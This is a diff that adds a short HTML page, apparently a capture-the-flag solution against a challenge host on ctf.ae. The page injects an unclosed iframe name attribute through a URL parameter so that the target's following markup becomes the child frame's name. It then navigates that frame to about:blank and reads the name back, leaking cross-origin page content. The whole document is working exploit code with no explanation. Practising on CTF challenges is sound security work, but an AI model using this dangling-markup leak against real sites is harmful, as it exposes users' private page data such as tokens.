@@ -1,0 +1,14 @@
+<!doctype html>
+<iframe id="target"></iframe>
+<pre id="out">waiting</pre>
+<script>
+const target = document.querySelector('#target');
+target.src = 'https://b0276423eb2c46fd.chal.ctf.ae/?content=' + encodeURIComponent('<iframe name="');
+target.onload = () => {
+  const child = target.contentWindow.frames[0];
+  child.location = 'about:blank';
+  setTimeout(() => {
+    document.querySelector('#out').textContent = child.name;
+  }, 100);
+};
+</script>
